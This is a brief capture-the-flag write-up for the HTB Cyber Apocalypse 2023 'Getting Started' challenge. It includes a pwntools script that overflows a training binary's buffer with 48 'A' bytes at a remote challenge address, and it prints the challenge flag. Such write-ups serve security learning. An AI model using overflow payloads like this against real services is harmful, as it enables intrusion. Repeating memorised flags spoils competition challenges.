# Getting Started - HTB Cyber Apocalypse 2023

## Description
Get ready for the last guided challenge and your first real exploit. It's time to show your hacking skills.

## Solution

The binary basically tells us it has a buffer overflow and we just need to overflow the 0xdeadbeef value to become anything else.

Sending 48 A's does the trick (but can be done in less).

All the information needed to figure this out is given by the binary itself when running it. No debugging or reversing required, just send a bunch of A's

```py
from pwn import *

io = remote("167.99.86.8",30042)

io.sendline(b'A'*48)

io.interactive()
```

## Flag
`HTB{b0f_s33m5_3z_r1ght?}`
